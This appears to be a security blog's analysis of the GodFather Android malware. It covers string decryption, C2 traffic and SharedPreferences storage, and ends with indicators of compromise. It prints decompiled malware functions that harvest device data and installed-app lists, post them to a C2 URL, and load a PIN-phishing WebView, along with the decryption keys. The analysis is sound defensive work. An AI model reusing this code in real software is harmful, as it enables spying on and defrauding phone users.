Http Get request to a specified URL, parses the HTML response to find a specific metatag and then stores the contents of that tag in the Android SharedPreferences                 Malacostraca       Function that exectues ab Http Post request with certain parameters and URL, using methods to support for Recover values and build demand                 Abourezk       Function that checks whether the app has permission to ignore battery optimization and, if it does not, request that permission. Once permission is obtained, it opens a specific URL in the chrome browser                 JJ       Function that determines a code based on the manufacturer and model of the Android device it is running on, and then uses the Sandrakottos method of the Tamarix class to send this code along with the “device” key                 speculated       Function that checks whether the device is locked. If it is not, it initiates a periodic action that checks a specific condition in the shared preferences and, if satisfied, cancels the timer and logs the event.                 untraffickable       Function that primarily handles the display of a Web page in a WebView, with specific configurations based on values obtained from methods in other classes (Tamarix and cirrofilum).                 Osnabruck       Function that returns a string containing the package names of the non-system applications installed on the Android device and writes this info to the sharedpreferences                 supersincerity       The function configures various parameters in the context of the application based on default values and the default language of the device.                 Champaka       Creates a random string used for “ky” of sharedpreferences           Shared Preference Unmask  The following is a version of app.xml with an explanation of the main fields and the functions that go into interacting with them.  https://github.com/phemt91/GodFather_String/blob/main/Shared%20Preference%20Details">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Ph3mt Blog">
<meta property="og:title" content="GodFather Android Malware Analysis">
<meta property="og:url" content="https://ph3mt.github.io//blog/2024/12/10/godfather-android-analysis.html">


  <meta property="og:description" content="GodFather is an Android malware that was first identified in mid 2023 and quickly attracted the attention of security experts because of its advanced capabilities and modular structure. Its design highlights a significant evolution from its predecessors, exploiting sophisticated techniques to circumvent security measures and infect Android devices.  In this article, we will explore how this version of the malware communicates with the C2 server, a critical component that allows attackers to manage the malware in real time and receive stolen data. We will also analyze GodFather’s use of Shared Preferences to store important data locally on the infected device, making it more difficult to detect and delete the collected information.  APK Overview  Looking for the SHA-256 of the apk on VirusTotal, we immediately notice that it is already reported as malicious by several security vendors.    The application bundle contains several files, the app.xml file contained in the shared_prefs looks interesting (it will be explained later).    The domain (which will be explained later in the article) also turns out to be malicious.    New Version of GodFather  The first thing one notices upon examining the apk is the absence of an anti-emulator check unlike the samples analyzed by muha2xmad and group-ib.  Step1 : Encrypted strings  The strings in the application appear to be encrypted, in fact in the following image you can see some of the encrypted strings used by the malware.    The class that deals with decrypt these strings is effluvias.  ![Figure 5 - Effluvias Class](/assets/images/2024-12-09-godfather-android-analysis/img5.png  This function decrypts a base64 text using the AES algorithm in CBC mode with PKCS5 padding.  Using JAVA, it is possible to reproduce the reverse mechanism to decipher the strings in the apk. Below is the code used to decipher the strings.  import java.util.Base64; import java.util.Arrays; import javax.crypto.Cipher; import javax.crypto.spec.IvParameterSpec; import javax.crypto.spec.SecretKeySpec; import java.nio.charset.StandardCharsets;   public class DecryptionExample {          public static void main(String[] args) {         // Check args         if (args.length == 0) {             System.out.println(&quot;Inserisci il testo cifrato.&quot;);             System.exit(1);         }           String encryptedText = args[0];           String decryptedText = effluvias(encryptedText);                  if (decryptedText != null) {             System.out.println(&quot;Decrypted text: &quot; + decryptedText);         } else {             System.out.println(&quot;Failed to decrypt text&quot;);         }     }       public static String effluvias(String ciphertext) {         try {             byte[] cipherbytes = Base64.getDecoder().decode(ciphertext);             byte[] initVector = Arrays.copyOfRange(cipherbytes, 0, 16);             byte[] messagebytes = Arrays.copyOfRange(cipherbytes, 16, cipherbytes.length);             IvParameterSpec iv = new IvParameterSpec(initVector);             SecretKeySpec skeySpec = new SecretKeySpec(&quot;B9M80O2RAK1VRJNV&quot;.getBytes(StandardCharsets.UTF_8), &quot;AES&quot;);             Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);             cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);             byte[] byte_array = cipher.doFinal(messagebytes);             return new String(byte_array, StandardCharsets.UTF_8);         } catch (Exception ex) {             ex.printStackTrace();             return null;         }     } }   With the script it was possible create a full list of Encrypted and Decrypted String, https://github.com/phemt91/GodFather_String.git  Step2 : C2 Communication  Having installed the apk in the emulator, it was possible to start observing its behavior. Regarding network calls, we can see an attempt to connect to the first  in the image below:    Examining the code we find references to it:    Using the script to decipher the strings in fact we find that:  o7lGWUU/28+5RpweyMuUGihsbHNkfHAHwgyycKpQfBmF6MkVSa58Dvr6WU6eFxLJ:https://t[.]me/famokorapisoram     The string also appears to be encrypted, plus we find that this particular string is also present in the Shared Preference:  &lt;string name=&quot;min&quot;&gt;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&lt;/string&gt;   Continuing the analysis we find that:    Contextualizing them:  Hagiography  The function takes a Base64-encoded string, decodes it into a byte array, assigns the decoded byte array to a global variable called cremosin, and returns the decoded string.      public static String hagiography(String c) {         cremosin = new byte[0];         byte[] decode = Base64.decode(c.getBytes(StandardCharsets.UTF_8), 0);         cremosin = decode;         return new String(decode);     }   Uriiah  The function is designed to encrypt a string s using a symmetric encryption algorithm (presumably Blowfish) with a secret key set “ABC”  public static String Uriiah(String s) {         String effluvias = (&quot;Blowfish&quot;);         try {             return samariums(s, new SecretKeySpec((&quot;ABC&quot;).getBytes(), effluvias), Cipher.getInstance(effluvias));         } catch (Exception e) {             return HttpUrl.FRAGMENT_ENCODE_SET;         }     }   Samariums This function takes a Base64-encoded string, decrypt it using a symmetric encryption algorithm with a secret key and a specific IV, returning the decrypted string.  public static String samariums(String s, SecretKeySpec sec, Cipher c) throws InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {         try {             byte[] val = Base64.decode(s, 0);             c.init(2, sec, new IvParameterSpec((&quot;abcdefgh&quot;).getBytes()));             return new String(c.doFinal(val));         } catch (Exception e) {             return HttpUrl.FRAGMENT_ENCODE_SET;         }     }   Starting with this information, it was possible to create a script that would allow us to decipher the string:  import javax.crypto.Cipher; import javax.crypto.spec.IvParameterSpec; import javax.crypto.spec.SecretKeySpec; import java.nio.charset.StandardCharsets; import java.util.Base64;   public class DecryptionScript {       public static void main(String[] args) {         String encryptedString = &quot;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&quot;;         String decryptedString = decrypt(encryptedString);         System.out.println(&quot;Decrypted String: &quot; + decryptedString);     }       public static String decrypt(String encryptedString) {         try {             String decrypted = Uriiah(encryptedString);             return decrypted;         } catch (Exception e) {             e.printStackTrace();             return null;         }     }       public static String Uriiah(String s) {         String effluvias = AnnotationHttp.effluvias(&quot;Blowfish&quot;);         try {             return samariums(s, new SecretKeySpec(AnnotationHttp.effluvias(&quot;ABC&quot;).getBytes(), effluvias), Cipher.getInstance(effluvias));         } catch (Exception e) {             e.printStackTrace();             return null;         }     }   public static String samariums(String s, SecretKeySpec sec, Cipher c) throws Exception {     byte[] val = Base64.getDecoder().decode(s);     c.init(Cipher.DECRYPT_MODE, sec);     return new String(c.doFinal(val), StandardCharsets.UTF_8); }       // Dummy class for AnnotationHttp     static class AnnotationHttp {         public static String effluvias(String s) {             // Dummy implementation             return s;         }     } }   It returns the following url:  https://yukoramparata[.]top/zamra/aaa/    Analyzing the endpoint on VirusTotal it was found to be malicious:    Step3 : Shared Preference and Talking with C2  When the application starts, a file called app.xml is created inside the shared preferences, containing several pieces of information:    &lt;?xml version=&#39;1.0&#39; encoding=&#39;utf-8&#39; standalone=&#39;yes&#39; ?&gt;   &lt;map&gt;       &lt;string name=&quot;acb&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;aox&quot;&gt;UGxheSBTdG9yZQ&lt;/string&gt;      &lt;string name=&quot;sy2&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;notification&quot;&gt;UGxlYXNlIGdyYW50IGFjY2Vzc2liaWxpdHkgcGVybWlzc2lvbiB0byB1c2UgdGhlIGFwcGxpY2F0aW9uLg&lt;/string&gt;      &lt;string name=&quot;btck&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;onb2&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;tag&quot;&gt;MDQwMUVO&lt;/string&gt;      &lt;string name=&quot;giflink&quot;&gt;aHR0cHM6Ly9zNS5naWZ5dS5jb20vaW1hZ2VzL1M4QWg2LmdpZg&lt;/string&gt;      &lt;string name=&quot;opc&quot;&gt;0&lt;/string&gt;      &lt;string name=&quot;messagex&quot;&gt;QSBuZXcgdmVyc2lvbiBvZiBvdXIgYXBwbGljYXRpb24gaXMgYXZhaWxhYmxlLiBUbyB1cGRhdGUsIGdvIHRvIFBsYXkgU3RvcmUu&lt;/string&gt;      &lt;string name=&quot;oph&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;cdm2&quot;&gt;reee&lt;/string&gt;      &lt;string name=&quot;alt&quot;&gt;com.melting.mantaught|||&lt;/string&gt;      &lt;string name=&quot;opi&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;ull1&quot;&gt;Rm9yY2Ugc3RvcA&lt;/string&gt;      &lt;string name=&quot;ull2&quot;&gt;dG8gcmVtb3Zl&lt;/string&gt;      &lt;string name=&quot;lowbattery&quot;&gt;TG93IEJhdHRlcnk&lt;/string&gt;      &lt;string name=&quot;xau&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;cdm&quot;&gt;reee&lt;/string&gt;      &lt;string name=&quot;opo&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;toast&quot;&gt;UGxlYXNlIGdyYW50IGFjY2Vzc2liaWxpdHkgcGVybWlzc2lvbiBmb3IgdGhlIGFwcGxpY2F0aW9uIHRvIHJ1bi4&lt;/string&gt;      &lt;string name=&quot;dsd&quot;&gt;none&lt;/string&gt;      &lt;string name=&quot;boa&quot;&gt;QWxsb3c&lt;/string&gt;      &lt;string name=&quot;btry&quot;&gt;0&lt;/string&gt;      &lt;string name=&quot;device&quot;&gt;2&lt;/string&gt;      &lt;string name=&quot;accs&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;psd&quot;&gt;falsefalse&lt;/string&gt;      &lt;string name=&quot;allow&quot;&gt;QWxsb3c&lt;/string&gt;      &lt;string name=&quot;rbt&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;fss&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;aduration&quot;&gt;1500&lt;/string&gt;      &lt;string name=&quot;locale&quot;&gt;en&lt;/string&gt;      &lt;string name=&quot;sb&quot;&gt;0&lt;/string&gt;      &lt;string name=&quot;duration&quot;&gt;500&lt;/string&gt;      &lt;string name=&quot;titlex&quot;&gt;SW5mb3JtYXRpb24&lt;/string&gt;      &lt;string name=&quot;bs&quot;&gt;0&lt;/string&gt;     &lt;string name=&quot;smm&quot;&gt;13 A50&lt;/string&gt;      &lt;string name=&quot;forwading&quot;&gt;Y29tLmxtci5sZm0&lt;/string&gt;      &lt;string name=&quot;min&quot;&gt;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&lt;/string&gt;      &lt;string name=&quot;ka&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;logsender&quot;&gt;0&lt;/string&gt;      &lt;string name=&quot;onb&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;restart&quot;&gt;cmVzdGFydA&lt;/string&gt;      &lt;string name=&quot;ullh&quot;&gt;Rk9SQ0UgU1RPUA&lt;/string&gt;      &lt;string name=&quot;sy&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;infobig&quot;&gt;UGxlYXNlIGdyYW50IHRoZSBwZXJtaXNzaW9uIHNob3duIGFib3ZlIGZvciB0aGUgYXBwbGljYXRpb24gdG8gcnVuLg&lt;/string&gt;      &lt;string name=&quot;again&quot;&gt;UGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4&lt;/string&gt;      &lt;string name=&quot;ntr&quot;&gt;true&lt;/string&gt;      &lt;string name=&quot;ullp&quot;&gt;Rm9yY2Ugc3RvcA&lt;/string&gt;      &lt;string name=&quot;ky&quot;&gt;0hh2fpkr5zt72&lt;/string&gt;      &lt;string name=&quot;permistoast&quot;&gt;WW91IGNhbm5vdCB1c2UgdGhlIGFwcGxpY2F0aW9uIHdpdGhvdXQgZ2l2aW5nIHRoZSBuZWNlc3NhcnkgcGVybWlzc2lvbi4&lt;/string&gt;      &lt;string name=&quot;aso&quot;&gt;false&lt;/string&gt;      &lt;string name=&quot;pl&quot;&gt;0&lt;/string&gt;   &lt;/map&gt;    Analyzing the wide variety of data, a question was asked: What are these strings? What are they used for?  The main functions involved in reading and writing Shared Preference are Bedamend and Sandrakottos:  Bedamned    The function retrives data from SharedPreference:  Opens the sharedpreference called “app” (app.xml) and return the string associated with key n from the SharedPreferences.  If the key does not exist, it returns a default value.      public static String bedamned(Context context, String n) {          SharedPreferences s = context.getSharedPreferences((&quot;app&quot;);          return s.getString(n, HttpUrl.FRAGMENT_ENCODE_SET);      }      Sandrakottos    The function writes data to shared preference, inserts the key-value paur (n,p) into the SharedPreferences        public static void Sandrakottos(Context context, String n, String p) {           SharedPreferences s = context.getSharedPreferences((&quot;app&quot;), 0);           SharedPreferences.Editor e = s.edit();           e.putString(n, p);           e.apply();       }    Having found the function that read and write the share preferences, it was possibile to proceed to the examination of the main functions that write and read data from the shared Preferences:  Champaka    The function generates a random string, which will then be used as the identifier of the device on which the malware is installed, to communicate with the c2 (we will see in the appropriate section). The function take the length of the string “a” as parameter. The created string will contain numbers from 0 to 9 and lowercase letters from a to z without w and x.      public static String champaka(int l) {         String a = (&quot;0123456789&quot;)+(&quot;abcdefghijklmpqrstuvyz&quot;).toLowerCase();         StringBuilder s = new StringBuilder(l);         for (int i = 0; i &lt; l; i++) {             int in = (int) (a.length() * Math.random());             s.append(a.charAt(in));         }         return s.toString();     }    Undissuadably    It Initializes an OkHttpClient  object with different timeouts, constructs a FormBody using the parameters provided in the HashMap. Creates and sends HTTP POST request with the parameters. If the response is valid and contains the string “Injection”,it  processes the response further, splits the result and invokes several functions, some of which appears to store values in SharedPreferences. Then it stores the result in the “obtainal” key.   public static String undissuadably(final Context context, String url, HashMap&lt;String, String&gt; params) {     try {         fiddlebow = new OkHttpClient();         OkHttpClient.Builder builder = new OkHttpClient.Builder();         TimeUnit timeUnit = TimeUnit.SECONDS;         fiddlebow = builder             .connectTimeout(50L, timeUnit)             .writeTimeout(50L, timeUnit)             .readTimeout(50L, timeUnit)             .callTimeout(50L, timeUnit)             .build();                  final FormBody.Builder builder2 = new FormBody.Builder();         nonstylized = builder2;         Objects.requireNonNull(builder2);                  params.forEach(new BiConsumer&lt;String, String&gt;() {             @Override             public void accept(String key, String value) {                 builder2.add(key, value);             }         });                  spekboom = nonstylized.build();                  Request build = new Request.Builder()             .addHeader(&quot;Content-Type&quot;, &quot;text/plain; charset=utf-8&quot;)             .addHeader(&quot;Connection&quot;, &quot;close&quot;)             .url(url)             .post(spekboom)             .build();                  Custer = build;                  fiddlebow.newCall(build).enqueue(new Callback() {             @Override             public void onFailure(Call call, IOException e) {             }               @Override             public void onResponse(Call call, Response response) throws IOException {                 String effluvias = &quot;cn&quot;;                 if (response.isSuccessful()) {                     try {                         String res = response.body().string();                         veepees.obtainal = res;                         try {                             if (!res.isEmpty()) {                                 veepees.obtainal = Tamarix.Uriiah(res);                             }                         } catch (Exception e) {                         }                         if (!Tamarix.bedamned(context, effluvias).contains(veepees.obtainal)) {                             if (veepees.obtainal.contains(&quot;Injection&quot;)) {                                 String[] split = veepees.obtainal.trim().split(&quot;:&quot;);                                 veepees.tautologys = split;                                 try {                                     rawedged.runtiest(context, split[8]);                                 } catch (Exception e2) {                                 }                                 try {                                     rawedged.reexpressing(context, veepees.tautologys[11]);                                 } catch (Exception e3) {                                 }                                 try {                                     Tamarix.Sandrakottos(context, &quot;dsd&quot;, veepees.tautologys[13]);                                 } catch (Exception e4) {                                 }                                 try {                                     Context context2 = context;                                     String[] strArr = veepees.tautologys;                                     rawedged.hyperemetic(context2, strArr[14], strArr[15]);                                 } catch (Exception e5) {                                 }                                 try {                                     Tamarix.Sandrakottos(context, &quot;psd&quot;, veepees.tautologys[22]);                                 } catch (Exception e6) {                                 }                                 try {                                     Besant.sublibrarianship(context, veepees.tautologys[21]);                                 } catch (Exception e7) {                                                                }                                 Tamarix.Sandrakottos(context, &quot;is&quot;, veepees.tautologys[1]);                             }                             Tamarix.Sandrakottos(context, effluvias, res);                         }                     } catch (Exception e8) {                                       }                 }             }         });         return HttpUrl.FRAGMENT_ENCODE_SET;     } catch (Exception e) {         return HttpUrl.FRAGMENT_ENCODE_SET;     } }     Spellican    This function creates an OkHttpClient.Builder.  It configures the timeouts for connect, write, read, and total call to 50 seconds each. Convert the response body to a string using a regex to search for a specific meta tag with property=”og:description” and capture the contents of the tag. For each occurrence found by the regex, call the Sandrakottos method to save the content in the SharedPreferences under the key “min”.    Which, in fact, turns out to be the C2 string analyzed earlier.   public static void spellican(String url, Context context) throws IOException {         OkHttpClient.Builder builder = new OkHttpClient.Builder();         TimeUnit timeUnit = TimeUnit.SECONDS;         OkHttpClient client = builder.connectTimeout(50L, timeUnit).writeTimeout(50L, timeUnit).readTimeout(50L, timeUnit).callTimeout(50L, timeUnit).build();         Request request = new Request.Builder().url(url).addHeader((&quot;User-Agent&quot;), (&quot;Mozilla/5.0 (Linux; Android 10; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36&quot;)).build();         try {             Response response = client.newCall(request).execute();             if (!response.isSuccessful()) {                 throw new IOException((&quot;Unexpected code&quot;) + response);             }             String tele = response.body().string();             Pattern pattern = Pattern.compile((&#39;&lt;meta property=\&quot;og:description\&quot; content=\&quot;(.*?)\&quot;&gt;&#39;), 32);             Matcher matcher = pattern.matcher(tele);             while (matcher.find()) {                 Sandrakottos(context, (&quot;min&quot;), matcher.group(1));             }             response.close();         } catch (IOException e) {             e.printStackTrace();         }     }     Rarefeatured    This function prepares and sends an http request. This function is confusing because it uses two variables called effluvias and effluvias2 with values “alt” and “ky” respectively, ( Effluvias is the same name as the function that is used to decipher strings).  A URL is constructed by concatenating the result of the Uriiah method applied to the result of the bedamned method with the key “min” and the string “callnew.php”. On the Shared Preference we can see   &lt;string name=&quot;min&quot;&gt;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&lt;/string&gt;  Deciphered with Uriiah function give us: https://yukoramparata.top/zamra/aaa/ , adding the string “callnew.php”:  https://yukoramparata[.]top/zamra/aaa/callnew[.]php  The rarefeatured function appears to prepare and send an HTTP POST request including a set of data retrieved from the SharedPreference       public static void rarefeatured(Context context, String e) {     public static void rarefeatured(Context context, String e) {         String effluvias = (&quot;alt&quot;);         String effluvias2 = (&quot;ky&quot;);         try {             HashMap&lt;String, String&gt; p = new HashMap&lt;&gt;();             p.put(effluvias2, bedamned(context, effluvias2));             p.put((&quot;tg&quot;), hagiography(bedamned(context, (&quot;tag&quot;))));             p.put((&quot;cy&quot;), bedamned(context, (&quot;locale&quot;)));             p.put((&quot;model&quot;), bedamned(context, (&quot;smm&quot;)));             p.put((&quot;nw&quot;), (&quot;true&quot;));             p.put(effluvias, bedamned(context, effluvias));             p.put((&quot;eys&quot;), e);             p.put((&quot;rpn&quot;), bedamned(context, (&quot;psv&quot;)));             veepees.undissuadably(context, Uriiah(bedamned(context, (&quot;min&quot;))) + (&quot;callnew.php&quot;), p);         } catch (Exception e2) {         }     }                  alt       com.melting.mantaught                 tg       0401EN                 cy       en                 model       13 A50                 nw       true                 ky       0hh2fpkr5zt72           Checking the requests from our device proxy:    Step4 : Retrieve Shared Preference and Talking with C2  The data it sends is all data that this malware retrieves in different ways, specifically:  JJ    The JJ function collects device information (manufacturer and model) and sends a specific code associated with these details using a call to Tamarix. Sandrakottos.  This could be used to keep track of the type of device that is using the app or to send specific information to the app server for device management or profiling. Ex. Using an emulator for analysis is returned the value device 2     public static void JJ(Context context) {     String r;     String d = Build.MANUFACTURER + Build.MODEL;       if (d.contains(&quot;HUAWEI&quot;)) {         r = &quot;0&quot;;     } else if (d.contains(&quot;Pixel&quot;)) {         r = &quot;1&quot;;     } else if (d.substring(0, 2).contains(&quot;LG&quot;)) {         r = &quot;3&quot;;     } else if (d.contains(&quot;Xiaomi&quot;)) {         r = &quot;5&quot;;     } else if (d.contains(&quot;OPPO&quot;) || d.contains(&quot;CPH&quot;)) {         r = &quot;4&quot;;     } else {         r = &quot;2&quot;;     }       Tamarix.Sandrakottos(context, &quot;device&quot;, r);    Untraffickable    It checks if the device is of a certain type (device equals “4”) via the Tamarix.bedamned. If true, it sets a value of “true” in the context with the key “opi”. Gets the intent and retrieve two values (str and id) passed through the intent.  If str is not null or empty, it sets a value “true” in the context with the key “rbt”. Configure a WebView with JavaScript enabled and a specific User-Agent. Extends WebViewClient and handles web page loading events.  The method onPagefinished: if the URL contains “STOP”, it performs a series of actions: •   Loads a blank page (About:blank) •   Updates some keys in the context with new values. •   Finish the activity. (finish) •   Extends webChromeClient •   Handles JavaScript Alert (onJsAlert) Otherwise, it checks the device type again and updates the keys in the context with “false” value.  This function returns false when the “back” button is pressed   public class untraffickable extends Activity {     private static String prevailed;       @Override     @SuppressLint({&quot;SetJavaScriptEnabled&quot;})     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);     }       @Override     public void onStart() {         super.onStart();         boolean equals = Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias(&quot;device&quot;)).equals(cirrofilum.effluvias(&quot;4&quot;));         String effluvias = cirrofilum.effluvias(&quot;true&quot;);         if (equals) {             Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;opi&quot;), effluvias);         }         Intent intent = getIntent();         String str = intent.getStringExtra(cirrofilum.effluvias(&quot;str&quot;));         prevailed = intent.getStringExtra(cirrofilum.effluvias(&quot;id&quot;));         if (!str.equals(HttpUrl.FRAGMENT_ENCODE_SET) || str != null) {             Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;rbt&quot;), effluvias);             WebView wv = new WebView(this);             wv.getSettings().setJavaScriptEnabled(true);             wv.getSettings().setUserAgentString(cirrofilum.effluvias(&quot;Mozilla/5.0 (Linux; Android 9; SM-J730F Build/PPR12.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36&quot;));             wv.setWebViewClient(new MyWebViewClient());             wv.setWebChromeClient(new MyWebChromeClient());             wv.loadUrl(Tamarix.Uriiah(Tamarix.bedamned(this, cirrofilum.effluvias(&quot;min&quot;))) + cirrofilum.effluvias(&quot;rx/f.php?f=&quot;) + str + cirrofilum.effluvias(&quot;&amp;p=&quot;) + Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias(&quot;ky&quot;)) + cirrofilum.effluvias(&quot;|&quot;) + Locale.getDefault().getLanguage().toLowerCase());             setContentView(wv);         }     }       public class MyWebViewClient extends WebViewClient {         @Override         public void onPageFinished(WebView view, String url) {             if (url.contains(cirrofilum.effluvias(&quot;STOP&quot;))) {                 view.loadUrl(cirrofilum.effluvias(&quot;about:blank&quot;));                 Context applicationContext = untraffickable.this.getApplicationContext();                 String effluvias = cirrofilum.effluvias(&quot;is&quot;);                 String rep = Tamarix.bedamned(applicationContext, effluvias);                 Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), effluvias, rep.replace(untraffickable.prevailed, HttpUrl.FRAGMENT_ENCODE_SET));                 Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias(&quot;opo&quot;), cirrofilum.effluvias(&quot;true&quot;));                 Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias(&quot;psv&quot;), cirrofilum.effluvias(&quot;0&quot;));                 Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias(&quot;rbt&quot;), cirrofilum.effluvias(&quot;false&quot;));                 untraffickable.this.finish();             }         }           @Override         public boolean shouldOverrideUrlLoading(WebView view, String url) {             return false;         }     }       public class MyWebChromeClient extends WebChromeClient {         @Override         public boolean onJsAlert(WebView view, String url, String message, JsResult result) {             return true;         }     }       @Override     public void onStop() {         super.onStop();         boolean equals = Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias(&quot;device&quot;)).equals(cirrofilum.effluvias(&quot;4&quot;));         String effluvias = cirrofilum.effluvias(&quot;false&quot;);         if (equals) {             Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;opi&quot;), effluvias);         }         Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;rbt&quot;), effluvias);     }       @Override     public void onDestroy() {         super.onDestroy();     }       @Override     public boolean onKeyDown(int keyCode, KeyEvent event) {         return false;     }       @Override     public void onBackPressed() {         super.onBackPressed();     } }    Analyzing the “construction” of the url will be: Within the method wv.loadrl:   wv.loadUrl(     Tamarix.Uriiah(Tamarix.bedamned(this, &quot;min&quot;)) +      &quot;rx/f.php?f=&quot; + str +      &quot;&amp;p=&quot; + Tamarix.bedamned(getApplicationContext(), &quot;ky&quot;) +      &quot;|&quot; + Locale.getDefault().getLanguage().toLowerCase() );    Tamarix.Uriiah(Tamarix.bedamned(this, “min”)): Uriiah method takes a value obtained from Tamarix.bedamned(this, “min”) and returns a fixed part of the URL. So https://yukoramparata.top/zamra/aaa/ “rx/f.php?f=” + str: adds the parameters “f” with the value obtained from the intent (str). “&amp;p=” + Tamarix.bedamned(getApplicationContext(), “ky”): adds the parameter “p” with a value obtained from  Tamarix.bedamned.  ”|” + Locale.getDefault().getLanguage().toLowerCase(): Adds the device language as a parameter in the URL. The parameters str and id could be generated by speculatd function (in detalis below). Below the code of the speculated function                           Intent dialogIntent = new Intent(ctx, untraffickable.class)                             .putExtra(&quot;str&quot;, &quot;ALL_PIN&quot;)                             .putExtra(&quot;id&quot;, &quot;1500&quot;);      The result: https://yukoramparata.top/zamra/aaa/rx/f.php?f=ALL_PIN&amp;p=0hh2fpkr5zt72|en  Speculated    The function gets an instance of KeyguardManager, it checks whether the device is locked using the isKeyguardLocked()  If the device is not locked (locked is false), the function creates a Timer object.  It defines an anonymous TimerTask that performs a periodic task   public static void speculated(final Context ctx) {     KeyguardManager km = (KeyguardManager) ctx.getSystemService(&quot;keyguard&quot;);     boolean locked = km.isKeyguardLocked();     if (!locked) {         try {             final Timer timerObj = new Timer();             TimerTask timerTask = new TimerTask() {                 @Override                 public void run() {                     if (Tamarix.bedamned(ctx, &quot;opi&quot;).contains(&quot;false&quot;)) {                         String bedamned = Tamarix.bedamned(ctx, &quot;opo&quot;);                         String effluvias = &quot;true&quot;;                         if (bedamned.contains(effluvias)) {                             Besant.mismoving.cancel();                             timerObj.cancel();                             Tamarix.Sandrakottos(ctx, &quot;oph&quot;, effluvias);                             return;                         }                         Intent dialogIntent = new Intent(ctx, untraffickable.class)                             .putExtra(&quot;str&quot;, &quot;ALL_PIN&quot;)                             .putExtra(&quot;id&quot;, &quot;1500&quot;);                         dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);                         dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);                         dialogIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);                         ctx.startActivity(dialogIntent);                     }                 }             };             mismoving = timerTask;             timerObj.schedule(timerTask, 0L, 2000L);         } catch (Exception e) {         }     } }      Osnabruck    In this function a “bowfin” string is initialized with the value, representing an empty string or URL escape character. A loop is run through the list of installed applications obtained through the PackageManager. For each PackageInfo in the list:    If the Flag_System flag of the application is disable (indicating that the application is non-system),   the application package name is added to the bowfin string, followed by |||. At the end, the bowfin string is passed to the Sandrakottos function.       public static String Osnabruck(Context context) {         bowfin = HttpUrl.FRAGMENT_ENCODE_SET;         try {             List&lt;PackageInfo&gt; b = context.getPackageManager().getInstalledPackages(0);             for (int i = 0; i &lt; b.size(); i++) {                 PackageInfo p = b.get(i);                 ApplicationInfo applicationInfo = p.applicationInfo;                 if ((applicationInfo.flags &amp; 1) == 0) {                     String a = applicationInfo.packageName;                     bowfin += a + (&quot;|||&quot;);                 }             }             Tamarix.Sandrakottos(context, (&quot;alt&quot;), bowfin);         } catch (Exception e) {         }         return bowfin;     }     Tamarix.Sandrakottos(context, (“alt”), bowfin);  In the shared preference we can see:    That is because we use a New Emulator with no application installed.  Malacostraca    This function retrieves the value associated with the key “ky” from the SharedPreference.  It Inserts an addition parameter with key “ick” and value “true” into the params map,  retrieves the value associated with key “min” from the shared preferences using the bedamned method.  After that it passes the retrived value to the Uriiah function to obtain the base URL.  Adds “call.php” to the obtained base url.  Call undissuadably method to perform an HTTP POST request to this URL with the params.     public static void Malacostraca(Context context) {     String effluvias = &quot;ky&quot;;     try {         HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;();                  params.put(effluvias, bedamned(context, effluvias));                  params.put(&quot;ick&quot;, &quot;true&quot;);                  String url = Uriiah(bedamned(context, &quot;min&quot;)) + &quot;callnew.php&quot;;                  veepees.undissuadably(context, url, params);     } catch (Exception e) {     } }    Conclusion  Analysis of some of GodFather’s features provided insight into its capabilities and operation. Here are the key points that emerged from our analysis:  •   C2 communication: GodFather uses encrypted communication with the command-and-control server to send stolen data and receive commands. This two-way channel allows attackers to manage the infection in real time, updating the malware with new instructions or exfiltrating additional data without raising suspicion.  •   Using Shared Preferences: The malware exploits Android’s Shared Preferences to store critical information, such as login details or temporary keys. This technique allows GodFather to retain data even after a device reboot, maintaining persistence and making it easier to retrieve the information for later use.  Indicator of Compromise                 App Name       Chrome.apk                 Package Name       com.melting.mantaught                 Sha256       20116083565a50f6b2db59011e9994e9a9f5db5994703d53233b8b202a5ad2f3                 Telegram Channel       https://t.me/famokorapisoram                 C2 Server       https://yukoramparata.top/zamra/aaa/           